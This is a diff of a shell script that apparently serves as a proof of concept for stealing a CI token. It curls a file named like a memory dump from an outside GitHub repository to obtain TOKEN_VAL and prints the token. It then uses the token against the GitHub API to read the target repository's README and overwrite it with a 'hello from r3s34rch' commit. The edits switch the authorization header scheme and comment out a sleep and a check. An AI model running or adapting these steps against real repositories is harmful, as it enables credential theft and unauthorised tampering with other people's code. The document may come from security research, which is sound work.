@@ -7,18 +7,20 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 echo "-----------------------------------------------------------------"
 echo "$TOKEN_VAL"
 echo "-----------------------------------------------------------------"
+
 echo "https://api.github.com/repos/${REPO}/contents/README.md"
 
-curl --request GET \ --url "https://api.github.com/repos/${REPO}/contents/README.md" \ --header "Authorization: Bearer $TOKEN_VAL"
+curl --request GET \ --url "https://api.github.com/repos/${REPO}/contents/README.md" \ --header "Authorization: token $TOKEN_VAL"
+
 curl \
     -X PUT \
     -H "Accept: application/vnd.github.v3+json" \
     -H "Authorization: token $TOKEN_VAL" \
     "https://api.github.com/repos/${REPO}/contents/README.md" \
     -d '{"message":"hello from r3s34rch","content":"'$(echo 'content'|base64)'", "sha":"SHA_FROM_ABOVE"}'
-sleep 6
+#sleep 6
 
-curl "https://api.github.com/repos/${REPO}/contents/README.md"      
+#curl "https://api.github.com/repos/${REPO}/contents/README.md"      
 
 #gh api --silent \
 #  --method POST \
